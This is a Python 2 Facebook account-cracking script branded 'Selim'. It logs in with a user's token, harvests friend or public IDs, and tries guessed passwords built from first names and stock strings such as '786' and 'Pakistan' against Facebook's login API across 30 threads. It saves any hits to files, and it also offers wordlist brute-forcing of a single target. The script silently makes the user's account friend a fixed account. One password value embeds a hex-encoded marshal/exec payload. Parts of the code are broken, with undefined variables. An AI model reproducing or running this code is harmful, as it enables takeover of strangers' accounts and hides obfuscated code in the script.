#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦
\033[1;92m            ╭━━━┳╮╭━┳━━━╮╭━━━┳━━━╮
\033[1;93m            ┃╭━╮┃┃┃╭┫╭━━╯┃╭━━┫╭━╮┃
\033[1;95m            ┃╰━╯┃╰╯╯┃╰━━╮┃╰━━╋╯╭╯┃
\033[1;95m            ┃╭╮╭┫╭╮┃┃╭━┳┻┻┳━╮┣━╯╭╯Selim
\033[1;93m            ┃┃┃╰┫┃┃╰┫┃╱╰━┳┻━╯┃┃╰━╮
\033[1;92m            ╰╯╰━┻╯╰━┻╯╱╱╱╰━━━┻━━━╯            
\033[1;91m       ♦♦♦———————————————————————————————♦♦♦
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;95m      ░██████╗███████╗██╗░░░░░██╗███╗░░░███╗
\033[1;91m      ██╔════╝██╔════╝██║░░░░░██║████╗░████║ 
\033[1;95m      ╚█████╗░█████╗░░██║░░░░░██║██╔████╔██║
\033[1;91m      ░╚═══██╗██╔══╝░░██║░░░░░██║██║╚██╔╝██║
\033[1;95m      ██████╔╝███████╗███████╗██║██║░╚═╝░██║
\033[1;91m      ╚═════╝░╚══════╝╚══════╝╚═╝╚═╝░░░░░╚═╝
                                                               

"""

jalan("\033[1;96m•◈•───────•◈ Assalamo Alaikum •◈•───────•◈•")  



jalan("    \033[1;95m Termux USERZ USE ANY PROXY ")	
jalan("    \033[1;91m WIFI USERZ USE ANY PROXY ")	

jalan("    \033[1;93m Welcome to Selim Creations ")

jalan("\033[1;96m•◈•──────────•◈•\033[1;96mSelimSpamer\033[1;96m•◈•──────────•◈•")

CorrectUsername = "selim"
CorrectPassword = "rkf52"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;97mUSER ID \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;97mPASWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.Youtube.com')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.Youtube.com/')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 50*"\033[1;96m▪"
		
		
		print('          \033[1;97m[◉] \x1b[1;96mLogin New Fresh Account \033[1;97m[◉]' )
		id = raw_input('          \033[1;97m[◉] \033[1;97mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('          \033[1;97m[◉] \033[1;97mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful...'
				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;97m[!] There is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;97mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══Start Hacking"	
	print "\033[1;32;40m[2] \033[1;33;40m══Update Selim"																														
	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\033[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;97mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\033[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;97m[✺] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Name : "+op["name"]
		except KeyError:
			print"\033[1;97m[✺] ID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\033[1;97m[+] \033[1;97mEnter the file name \033[1;97m: \033[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;97mFill in correctly"
		pilih_super()

	
	print "\033[1;36;40m[✺] Total IDs : \033[1;97m"+str(len(id))
	jalan('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
	print "   \033[1;31;48m ●🇧🇩══════════════════◄►══════════════════🇧🇩●"

	jalan('                    \033[1;97mSelim start cloning Wait...')
	print  "  \033[1;36;48m   ●💞═════════════════👁👁═════════════════💞●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;95m ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;95m ' + pass1 + ' 👽 ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;92m ' + pass2 + ' 👽 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;92m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;93m ' + pass3 + ' 👽 ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;93m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;94m ' + pass4 + ' 👽 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;94m ' + pass4 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;91m ' + pass5 + ' 👽 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;91m ' + pass5 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['phone_number'] + '2320436F6D70696C6564204279203A2042696E79616D696E0A2320476974487562203A2068747470733A2F2F6769746875622E636F6D2F42696E79616D696E2D62696E6E690A2320596F7554756265204368616E6E656C203A20547269636B2050726F6F660A696D706F7274206D61727368616C0A65786563286D61727368616C2E6C6F6164732827635C7830305C7830305C7830305C7830305C7830305C7830305C7830305C7830305C7830335C7830305C7830305C783030405C7830305C7830305C78303073215C7830305C7830305C783030645C7830305C783030645C7830315C7830306C5C7830305C7830305A5C7830305C783030655C7830305C7830306A5C7830315C783030645C7830325C7830305C7838335C7830315C783030645C7830315C7830305C78303455645C7830315C78303053285C7830335C7830305C7830305C783030695C7866665C7866665C7866665C7866664E73305C7830335C7830305C783030785C7839635C786264565C7864644E5C786462305C7831345C7862655C7863665358415A5C7864335C7839315C7861365C7830336E585C7861375E5C7863305C7861385C78643824585C783131655C7839615C7861364D5C7838615C7864325C7863346D3C5C7831325C7864625C7862335C7831645C7839355C7866325C7830345C7862625C783034695C783035695C7831325C7862377B305C783965645C7863374E5C7864335C7839365C7861365C7865314F625C7839365C7839353A5C7863375C7839665C7862665C7865665C7866385C7839635C7866385C7864346B5C7861385C7866315C7862615C783831425C7831365C7831313A6C5C7861314C5C725C7831615C7864625C7864616229316E595C7830385C78316149395C7831335C6E315C7865395C7863615C786231745C783135495C7862315C7831625C7830355C6E5C7839625C7838315C783038685C78633452375C783065645C7839635C7839305C7862652B5C7862305C786162625C7838315C7830335C7863645C7865355C7866655C7839305C7838635C7862615C783939485C786634445C7863385C786438295C7863317A345C7863345C7838615C783037525C786261295C7830655C7865335C7838305C783932735C7865305C7863303F332C5C783935745C786662415C7839325023395C7831302C45695C783936285C7863325C7830355C7830625C7862315C7839345C7863305C786537715C7863365C7839325C7863325C7839395C7831335C786133725C7830345C783936395C7862655C7865305C7866315C786630595C7838385C786239225C7838635C7863615C7830325C7866655C783965515C783861436D5C7865615C7830385C7863315C7863345C783832465C786531455C7838315C7864635C7831356C245C7862315C786230725C7830655C7866345C786431585C7863645C7861323C5C7831384C7A5C7831305C7830355C783835535C7861375C7863365C745C786466445C7838344A5C7830356E5C7863665C7863346B5C7866357B61335C7862645C7831325C7863655C7862655C783833335C7861315C786230735C7838635C7830655C7862345C275C7831335C7838635C7862395C78623351665C7831665C7861625C7839385C7864314D5C7864346F5C7863305C6E5C7838665C7838665C783831575C7865305C7838345C7830355C7839315C7830335C7838385C7862615C7830355C7830664F625C7831355C786531415C7830305C7864315C786334344F5C786233535C783833346F5C78303374413E4C702040714D37745C7864305C7864645C78656622335C7862345C78313236646D5C7864625C7862362D5C7865625C7866365C7865615C786437725C7839665C5C5C7864665E5D565C7866345C7839355C7863385C786161555C7861625C7865645C7838355C7865345C7865345C7866375C7865645C786534425C7866375C786662545C7861625C7839305C7866395C7861305C6E5C7862666C5F5C7862395C7863625C7862665C7862375C7839335C783962555C7831622A215C7861375C7838635C7863665C7839332C5C7866623E5C786639335C7862354C5C7866624D5C7830355C7866325C7864395C7839322B765C786639205C7863355D5C7863395C786337465C7865355C7864612A5C7865645C7865365C786132425C7865665C786232405C7864652C5C7862665C786165605C7862385C7863666E355C7839655C7864632C5C7830625C786564642A5C7863365C7830325C783865595C7830625C7865645C7831323A5C783065525C78303245695C7839665C7861385C783066595C7864665C783138635C7861355C7862386C355C783962435C7861325C7865325C7861635C7865665C7838352C6D5C7866365C7861375C7862385C7830365C783063285C7862315C786430575C7839365C783964647D5C7861635C7864315C275C7838325C7838345C7861375C7865384830365C7862305C7864302E5C783163265C7863395C7839395A60517A5C7839655C786562695C7861663F5C7839645C7864355C7839345C786436737C475C78306634735C7838615C7863334C5C6E5C78643446765C7865315C7862336D5C7838357C5C7831345C7831395C7838625C786165215C7862365C7830355C7863355C783032654E7D5C7862395C7864655C7863642A5C7838343673415C7861387274695C7863385C7864665C7838315C7862332D5C7838325C7839314F285C7863665C783934635C7861335C7839336E5C7866375C7830307D5C786565755C7838653F5C7865645C78316376605C7862375C78643365645C7838305C7838637A5C783162692F5A335C7838375C7862395C7839335C7863665C786533445C7865325C7862395C786235427B5C7839355C7866655C7864635C786236427B5C7831645C7862345C7864366D5C7865345C7838635C7830345C7861335C7863335C7866615C7830324B5C7862395C7862322E555C7864375C786233685C786438605C7831635C786433595C786236465C7861335C78393137665C7839395C7838325C7865345C7839615C7863345C7838375C7830625C7866395C7861625C78636429207C265C7838635C7866635C783839615C7861635C786461425C7839312B5C7865345C7838344C5C7830385C7866385C272B765C7830315C7839392B5C7863375C786664685C7861375C7864375C7866625C7864323D5C7864655C7862625C783133775C783933635C7838383B5C7866635C786365237C5C7866655C783932715C786166745C7862615C786234685C7864315C78653175705C7866305C786666265C7861625C7866385C7866384C5C7863365C7863655F3C635C7831355C783162375C7838375C7861665C7831325C7866645C7866645C7863645C7864365C7864365C7862375C783864776F375C7864335C783033365C7830345C7864365E5C7831365C7865616B5C786431204B5C783132335C786635265C7862354B5C7831375C783861304E595C7838345C7864365C7863665C7839305C7861375B5C7866655C7866345C786263475C5C2A6C5C786166395C7830355C78613357655C7864615C7865325C7863365C7865315C78316477765C7866365C7830653B5E5C7831615C7830315C7830363E305C7864665C786137415C7838617D5C7862665C7864645C7862367D3F5C725C7830385C7866357D3B5C783066255C7839635C7838365C7837665C6E5C7864665C6E34285C7830325C7830305C7830305C783030745C7830345C7830305C7830305C7830307A6C6962745C6E5C7830305C7830305C7830306465636F6D7072657373285C7830305C7830305C7830305C783030285C7830305C7830305C7830305C783030285C7830305C7830305C7830305C783030735C7830345C7830305C7830305C7830305C7831625B306D745C7830385C7830305C7830305C7830303C6D6F64756C653E5C7830345C7830305C7830305C783030735C7830325C7830305C7830305C7830305C7830635C783031272929'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;96m ' + pass6 + ' 👽 ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;96m ' + pass6 + ' 👽 ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97m....'
	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[1;31;40m ●════════════════════════◄►════════════════════════●
           """
	raw_input("\n\033[1;97m[\033[1;97mExit\033[1;97m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;97m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\033[1;97m[+] \033[1;97mID\033[1;97m/\033[1;97mEmail \033[1;97mTarget \033[1;97m:\033[1;97m ')
            passw = raw_input('\033[1;97m[+] \033[1;97mWordlist \033[1;97mext(list.txt) \033[1;97m: \033[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\033[1;97m[\033[1;97m\xe2\x9c\x93\033[1;97m] \033[1;97mTarget \033[1;97m:\033[1;97m ' + email
            print '\033[1;97m[+] \033[1;97mTotal\033[1;97m ' + str(len(total)) + ' \033[1;97mPassword'
            jalan('\033[1;97m[\xe2\x9c\xba] \033[1;97mPlease wait \033[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[1;97m[\033[1;97m\xe2\x9c\xb8\033[1;97m] \033[1;97mTry \033[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\033[1;97m[+] \033[1;97mFounded.'
                        print 52 * '\033[1;97m\xe2\x95\x90'
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\033[1;97m[+] \033[1;97mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                            print '\033[1;97m[!] \033[1;97mAccount Maybe Checkpoint'
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\033[1;97m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\033[1;97m[!] File not found...'
            print """\n\033[1;97m[!] \033[1;97mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()
